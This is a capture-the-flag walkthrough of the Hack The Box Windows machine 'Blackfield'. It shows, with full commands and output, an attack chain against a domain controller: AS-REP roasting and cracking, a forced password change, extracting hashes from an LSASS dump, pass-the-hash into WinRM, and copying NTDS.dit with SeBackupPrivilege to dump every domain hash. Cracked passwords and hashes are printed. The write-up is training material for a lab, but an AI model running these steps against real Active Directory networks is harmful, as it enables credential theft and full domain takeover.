# 1. Introduction

**Machine Name:** Blackfield
**Difficulty:** Hard
**OS:** Windows
**Author:** aas 
**Release Date:**  06/06/2020
**Date:**  11/26/2025

# 2. Recon
## 2.1 Nmap Scan

We start by doing an nmap scan of the host. 
Based on the open ports, it looks like a regular AD Domain Controller with no web ports open:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-26 04:05 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:05
Completed NSE at 04:05, 0.00s elapsed
Initiating NSE at 04:05
Completed NSE at 04:05, 0.00s elapsed
Initiating NSE at 04:05
Completed NSE at 04:05, 0.00s elapsed
Initiating Ping Scan at 04:05
Scanning 10.129.47.118 [4 ports]
Completed Ping Scan at 04:05, 1.31s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:05
Completed Parallel DNS resolution of 1 host. at 04:05, 0.02s elapsed
Initiating SYN Stealth Scan at 04:05
Scanning 10.129.47.118 [1000 ports]
Discovered open port 445/tcp on 10.129.47.118
Discovered open port 53/tcp on 10.129.47.118
Discovered open port 135/tcp on 10.129.47.118
Discovered open port 3268/tcp on 10.129.47.118
Discovered open port 88/tcp on 10.129.47.118
Discovered open port 593/tcp on 10.129.47.118
Discovered open port 5985/tcp on 10.129.47.118
Discovered open port 389/tcp on 10.129.47.118
Completed SYN Stealth Scan at 04:05, 2.90s elapsed (1000 total ports)
Initiating Service scan at 04:05
Scanning 8 services on 10.129.47.118
Completed Service scan at 04:06, 6.99s elapsed (8 services on 1 host)
NSE: Script scanning 10.129.47.118.
Initiating NSE at 04:06
Completed NSE at 04:06, 40.07s elapsed
Initiating NSE at 04:06
Completed NSE at 04:06, 1.27s elapsed
Initiating NSE at 04:06
Completed NSE at 04:06, 0.00s elapsed
Nmap scan report for 10.129.47.118
Host is up (0.020s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-26 16:06:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-26T16:06:08
|_  start_date: N/A
|_clock-skew: 6h59m59s

NSE: Script Post-scanning.
Initiating NSE at 04:06
Completed NSE at 04:06, 0.00s elapsed
Initiating NSE at 04:06
Completed NSE at 04:06, 0.00s elapsed
Initiating NSE at 04:06
Completed NSE at 04:06, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.96 seconds
           Raw packets sent: 2000 (87.952KB) | Rcvd: 9 (380B)

```

We note the domain name, BLACKFIELD.local, and port 5985 (usually WinRM) open.
We add the domain name to our /etc/hosts file and start probing SMB with NetExec.

## 2.2 Port 445 - SMB

We check the SMB port with NetExec and find the following:

```
──(kali㉿kali)-[~/writeups/blackfield]
└─$ nxc smb blackfield.local -u '' -p '' --shares
SMB         10.129.47.118   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.47.118   445    DC01             [+] BLACKFIELD.local\: 
SMB         10.129.47.118   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                
┌──(kali㉿kali)-[~/writeups/blackfield]
└─$ nxc smb blackfield.local -u 'asd' -p '' --shares
SMB         10.129.47.118   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.47.118   445    DC01             [+] BLACKFIELD.local\asd: (Guest)
SMB         10.129.47.118   445    DC01             [*] Enumerated shares
SMB         10.129.47.118   445    DC01             Share           Permissions     Remark
SMB         10.129.47.118   445    DC01             -----           -----------     ------
SMB         10.129.47.118   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.47.118   445    DC01             C$                              Default share                                                                                               
SMB         10.129.47.118   445    DC01             forensic                        Forensic / Audit share.                                                                                     
SMB         10.129.47.118   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.47.118   445    DC01             NETLOGON                        Logon server share                                                                                          
SMB         10.129.47.118   445    DC01             profiles$       READ            
SMB         10.129.47.118   445    DC01             SYSVOL                          Logon server share                                                                               
```

First, we find out the NetBIOS name of the DC, **DC01**. We add it to our hosts file.
Secondly, we see that null session authentication gives us "ACCESS DENIED", but a non-existent user  authenticates us as Guest with READ permissions on non-standard share **profiles$**.

We take a look at this share using NetExec's module Spider Plus:

```
└─$ nxc smb blackfield.local -u 'asd' -p '' -M spider_plus 
```

And we get a bunch of empty folders. Doesn't seem this share will lead us anywhere.

```
SPIDER_PLUS 10.129.47.118   445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.47.118   445    DC01             [*] Total folders found:  314
SPIDER_PLUS 10.129.47.118   445    DC01             [*] Total files found:    0
```

# 3 User

## 3.1 Foothold as "support"

**RID Bruteforce**
Before we proceed any further, we use NetExec's tool to enumerate usernames by bruteforcing RIDs:

```
└─$ nxc smb blackfield.htb -u 'asd' -p '' --rid-brute
SMB         10.129.47.118   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.47.118   445    DC01             [+] BLACKFIELD.local\asd: (Guest)
SMB         10.129.47.118   445    DC01             498: BLACKFIELD\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                      
SMB         10.129.47.118   445    DC01             500: BLACKFIELD\Administrator (SidTypeUser)
SMB         10.129.47.118   445    DC01             501: BLACKFIELD\Guest (SidTypeUser)
SMB         10.129.47.118   445    DC01             502: BLACKFIELD\krbtgt (SidTypeUser)
SMB         10.129.47.118   445    DC01             512: BLACKFIELD\Domain Admins (SidTypeGroup)
SMB         10.129.47.118   445    DC01             513: BLACKFIELD\Domain Users (SidTypeGroup)
SMB         10.129.47.118   445    DC01             514: BLACKFIELD\Domain Guests (SidTypeGroup)
SMB         10.129.47.118   445    DC01             515: BLACKFIELD\Domain Computers (SidTypeGroup)                                                                                             
SMB         10.129.47.118   445    DC01             516: BLACKFIELD\Domain Controllers (SidTypeGroup)                                                                                           
SMB         10.129.47.118   445    DC01             517: BLACKFIELD\Cert Publishers (SidTypeAlias)                                                                                              
SMB         10.129.47.118   445    DC01             518: BLACKFIELD\Schema Admins (SidTypeGroup)
SMB         10.129.47.118   445    DC01             519: BLACKFIELD\Enterprise Admins (SidTypeGroup)                                                                                            
SMB         10.129.47.118   445    DC01             520: BLACKFIELD\Group Policy Creator Owners (SidTypeGroup)                                                                                  
SMB         10.129.47.118   445    DC01             521: BLACKFIELD\Read-only Domain Controllers (SidTypeGroup)                                                                                 
SMB         10.129.47.118   445    DC01             522: BLACKFIELD\Cloneable Domain Controllers (SidTypeGroup)                                                                                 
SMB         10.129.47.118   445    DC01             525: BLACKFIELD\Protected Users (SidTypeGroup)                                                                                              
SMB         10.129.47.118   445    DC01             526: BLACKFIELD\Key Admins (SidTypeGroup)
SMB         10.129.47.118   445    DC01             527: BLACKFIELD\Enterprise Key Admins (SidTypeGroup)                                                                                        
SMB         10.129.47.118   445    DC01             553: BLACKFIELD\RAS and IAS Servers (SidTypeAlias)                                                                                          
SMB         10.129.47.118   445    DC01             571: BLACKFIELD\Allowed RODC Password Replication Group (SidTypeAlias)                                                                      
SMB         10.129.47.118   445    DC01             572: BLACKFIELD\Denied RODC Password Replication Group (SidTypeAlias)                                                                       
SMB         10.129.47.118   445    DC01             1000: BLACKFIELD\DC01$ (SidTypeUser)
SMB         10.129.47.118   445    DC01             1101: BLACKFIELD\DnsAdmins (SidTypeAlias)
SMB         10.129.47.118   445    DC01             1102: BLACKFIELD\DnsUpdateProxy (SidTypeGroup)                                                                                              
SMB         10.129.47.118   445    DC01             1103: BLACKFIELD\audit2020 (SidTypeUser)
SMB         10.129.47.118   445    DC01             1104: BLACKFIELD\support (SidTypeUser)
SMB         10.129.47.118   445    DC01             1105: BLACKFIELD\BLACKFIELD764430 (SidTypeUser)                                                                                             
SMB         10.129.47.118   445    DC01             1106: BLACKFIELD\BLACKFIELD538365 (SidTypeUser)                                                                                             
SMB         10.129.47.118   445    DC01             1107: BLACKFIELD\BLACKFIELD189208 (SidTypeUser)                                                                                             
SMB         10.129.47.118   445    DC01             1108: BLACKFIELD\BLACKFIELD404458 (SidTypeUser)                                                                                             
SMB         10.129.47.118   445    DC01             1109: BLACKFIELD\BLACKFIELD706381 (SidTypeUser)  

[SNIP]  
```

This yields a long list of usernames, many of them with the format BLACKFIELD######. We generate a list of users.

Let's see if any of them do not require preauthentication, which would make them vulnerable to an AS-REP Roasting attack. We use Impacket's GetNPUsers with our shiny new user list:

```
└─$ impacket-GetNPUsers -usersfile users.txt -dc-ip dc01.blackfield.local blackfield.local/
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:a80cc7938df79b633df856b95f54c1bc$bba0c85e6ade59a2474d5fec77474fead96cd67d3e38d2230f8990d4a22c09b45345dfb61125899d6a5c9372e2b1dc9959a6e1ecb8be6dee2e7e7d7ec86ab0d89820afd201ec84525114d5e9722d35ff848e006aedf8a7d624984c3c48046bf438b0a206e2c410f68595d03f6b354ac05c1f15d01007e698e2dc519afb038303a651c9c255a644691b133af1bec9a118db4ebbb53cb335336672dbe7f145a4143293e0d180055341a9fd16404b15a5bfcc708aea6f33c70b28a0e102aeb9592947e0b737e1ce66dad39023744daaab687e7d9613ee340bf4c8d46d3bd2d1a272e31893115b57f5f1eec937cb596ca4df269b743a
[-] User BLACKFIELD764430 doesn't have UF_DONT_REQUIRE_PREAUTH set
[SNIP]
```

And there we go, we have a hash for user **support**. Let's see if it cracks:

```
└─$ john support.hash   --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:10 DONE (2025-11-26 04:33) 0.09398g/s 1347Kp/s 1347Kc/s 1347KC/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

After just 10 seconds, we got the password! Let's see what we can do with it.

## 3.2 Compromising "audit2020"

This user has access to two additional default shares, NETLOGON and SYSVOL, which can occasionally be useful. Sadly, no WinRM access just yet.
More importantly, however, we now have access to a domain user, which means we can enumerate LDAP to get a layout of the domain. We use RustHound-CE for this:

```
└─$ ./rusthound-ce --domain blacfield.local  -c All -f dc01.blackfield.local  -u support  -p '#00^BlackKnight'
```

**ForceChangePassword**
We fire up BloodHound and feed it the files.

Checking the Outbound Object control of our compromised user, we see that it has ForceChangePassword rights over user **audit2020**:

![[Pasted image 20251126044830.png]]

With BloodyAD, it is trivial to change this user's password to a known value:

```
└─$ bloodyAD -u support  -p '#00^BlackKnight' -d blackfield.local --host dc01.blackfield.local set password audit2020 'Welcome1!'
[+] Password changed successfully!
```

Bloodhound doesn't show any obviously exploitable edges for this user, and we still don't have WinRM access.

## 3.3 Shell as svc_backup

It would make sense that a user with "audit" in its name would have access to different shares. Let's see!

```
└─$ nxc smb blackfield.local -u 'audit2020' -p 'Welcome1!' --shares
SMB         10.129.47.118   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.47.118   445    DC01             [+] BLACKFIELD.local\audit2020:Welcome1! 
SMB         10.129.47.118   445    DC01             [*] Enumerated shares
SMB         10.129.47.118   445    DC01             Share           Permissions     Remark
SMB         10.129.47.118   445    DC01             -----           -----------     ------
SMB         10.129.47.118   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.47.118   445    DC01             C$                              Default share                                                                                               
SMB         10.129.47.118   445    DC01             forensic        READ            Forensic / Audit share.                                                                                     
SMB         10.129.47.118   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.47.118   445    DC01             NETLOGON        READ            Logon server share                                                                                          
SMB         10.129.47.118   445    DC01             profiles$       READ            
SMB         10.129.47.118   445    DC01             SYSVOL          READ            Logon server share                                                                                
```

And it does! Let's check out the **forensic** share:

```
└─$ impacket-smbclient 'audit2020':'Welcome1!'@dc01.blackfield.local
```

It contains many potentially interesting files. If I had to guess, they come from a previous pentest or security audit.
Inside the memory analysis folder, a file stands out: **lsass.zip**. LSASS stands for Local Security Authority Subsystem Service.
It goes without saying that this can be extremely sensitive.

We download, unzip, and check the file:
```
└─$ file lsass.DMP 
lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
```


PypyKatz, Mimikatz' implementation in Python, can extract credentials from an LSASS memory dump like so:

```└─$ pypykatz lsa minidump lsass.DMP ```

This reveals a treasure trove of information, with information about logon sessions from several sensitive users.
The password hashes for the accounts with the most privileges (Administrator and DC01$) are not working. The passwords were probably rotated after the security audit. But there's an NTLM hash for a user that might have been overlooked:

```FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
```

If the username is accurate and this account is a member of Backup Operators, full compromise of the domain should be quite easy.

We try to pass the hash with NetExec and it works. And this time we finally have WinRM access!

```
└─$ nxc winrm blackfield.local -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d' 
WINRM       10.129.47.118   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.129.47.118   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```
# 4. Root

## 4.1 Backup Operators

We connect to WinRM with user **svc_backup**. I use adityatelange's[ Python EvilWinRM](https://github.com/adityatelange/evil-winrm-py), highly recommended! 

```
└─$ evil-winrm -i dc01.blackfield.local -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
```

As expected, the user is a member of **Backup Operators** and has two extremely powerful privileges: **SeBackupPrivilege** and **SeRestorePrivilege**.

```
evil-winrm-py PS C:\Users\svc_backup\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID                                           
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

This effectively entails write and read access to the entire disk.

## 4.2 SeBackupPrivilege

[This](https://github.com/k4sth4/SeBackupPrivilege) Github repo contains step-by-step instructions on how to leverage **SeBackupPrivilege** to copy Windows registry hives and NTDS.dit, which would enable an offline DCSync attack to retrieve the Domain Admin hash (among other sensitive information).
Let's start!

We start by cloning the repo and uploading and importing the two DLLs we'll use to copy the files. EvilWinRM has a very nice upload feature for this purpose:

```
evil-winrm-py PS C:\Users\svc_backup\Documents> cd \temp
evil-winrm-py PS C:\temp> upload SeBackupPrivilegeCmdLets.dll cmdlets.dll
Uploading /home/kali/writeups/blackfield/SeBackupPrivilegeCmdLets.dll: 100%|█| 12.0k/12.0k [00:0
[+] File uploaded successfully as: C:\temp\cmdlets.dll
evil-winrm-py PS C:\temp> upload SeBackupPrivilegeUtils.dll utils.dll
Uploading /home/kali/writeups/blackfield/SeBackupPrivilegeUtils.dll: 100%|█| 16.0k/16.0k [00:00<
[+] File uploaded successfully as: C:\temp\utils.dll
evil-winrm-py PS C:\temp> Import-Module .\cmdlets.dll
evil-winrm-py PS C:\temp> Import-Module .\utils.dll
```

Next, we create a script that initializes a persistent, read-only IVFS container backed by volume C:, stores its metadata at C:\test\test.cab, and mounts it as virtual drive Z:.

```
set context persistent nowriters
set metadata c:\\temp\\test.cab        
set verbose on
add volume c: alias test
create
expose %test% z:
```

We need line endings to be Windows style (\r\n instead of \n):

```
└─$ unix2dos vss.dsh   
unix2dos: converting file vss.dsh to DOS format...
```

And we upload it.
Now we use shadowdisk.exe to process the script and create and expose the volume shadow copy:

```
evil-winrm-py PS C:\temp> diskshadow /s c:\\temp\\vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  11/26/2025 10:41:49 AM

-> set context persistent nowriters
-> set metadata c:\\temp\\test.cab        
-> set verbose on
-> add volume c: alias test
-> create

Alias test for shadow ID {c42b4d5b-7802-4087-a56a-864e53191a66} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {600483dc-26bd-4b4b-971a-60b549cbf213} set as environment variable.
Inserted file Manifest.xml into .cab file test.cab
Inserted file Dis75AC.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {600483dc-26bd-4b4b-971a-60b549cbf213}

        * Shadow copy ID = {c42b4d5b-7802-4087-a56a-864e53191a66}               %test%
                - Shadow copy set: {600483dc-26bd-4b4b-971a-60b549cbf213}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 11/26/2025 10:41:51 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %test% z:
-> %test% = {c42b4d5b-7802-4087-a56a-864e53191a66}
The shadow copy was successfully exposed as z:\.
```

Lastly, we copy NTDS.dit and the SYSTEM registry hive, and download them with EvilWinRM's download function:

```
evil-winrm-py PS C:\temp> Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\temp\\ntds.
dit
evil-winrm-py PS C:\temp> reg save HKLM\SYSTEM C:\\temp\\SYSTEM
The operation completed successfully.

evil-winrm-py PS C:\temp> download ntds.dit ntds.dit
Downloading C:\temp\ntds.dit: 100%|████████████████████████| 18.0M/18.0M [00:11<00:00, 1.62MB/s]
[+] File downloaded successfully and saved as: /home/kali/writeups/blackfield/ntds.dit
evil-winrm-py PS C:\temp> download SYSTEM SYSTEM
Downloading C:\temp\SYSTEM: 16.8MB [00:09, 1.92MB/s]                                            
[+] File downloaded successfully and saved as: /home/kali/writeups/blackfield/SYSTEM
```

## 4.3 DCSync

With these two files in our Kali machine, we could perform a local DCSync attack with Impacket's secretsdump:

```
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM local                        
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

We get the hash for the Domain Admin.

```
└─$ evil-winrm -i dc01.blackfield.local -u Administrator -H '184fb5e5178480be64824d4cd53b99ee'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc01.blackfield.local:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
tblackfield\administrator
evil-winrm-py PS C:\Users\Administrator\Documents> type \users\administrator\desktop\root.txt
4375a629c7c67c8e29db269060c955cb
```

And that's the box!
A good reminder to protect members of Backup Operators as if they were Domain Admins, since they can very easily compromise a DC.

# Beyond Root

## SeRestorePrivilege

On occasion, I have found that the Disk Shadow technique might not work on a specific host for a number of reasons. While we would still have read access to MOST files in the system, NTDS.dit would still be out of reach.

For cases like this, remember that as a member of Backup Operators you have another powerful privilege: SeRestorePrivilege.
Full write access to the disk means that you can overwrite service binaries with a malicious binary that would grant you control over the host. Moreover, as a member of Backup Operators, you should have rights to stop and start a number of services.

If you want to try this, check out [this article](https://www.hackplayers.com/2020/06/backup-tosystem-abusando-de-los.html) by CyberVaca (in Spanish) and let me know how it went!

